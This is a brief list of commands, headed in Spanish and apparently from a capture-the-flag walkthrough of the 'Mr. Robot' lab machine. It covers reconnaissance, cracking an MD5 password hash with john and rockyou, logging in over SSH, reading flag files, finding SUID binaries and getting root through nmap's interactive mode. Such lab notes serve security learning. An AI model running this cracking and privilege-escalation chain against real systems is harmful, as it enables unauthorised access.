# Comandos utilizados

```bash
curl http://10.64.170.84/robots.txt
nmap -Pn -p 22 10.64.170.84
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/robot-md5.txt
john --show --format=raw-md5 /tmp/robot-md5.txt
ssh robot@10.64.170.84
whoami
cat /home/robot/key-2-of-3.txt
sudo -l
find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/nmap --version
```

Dentro del modo interactivo de Nmap:

```text
id
cat /root/key-3-of-3.txt
quit
```
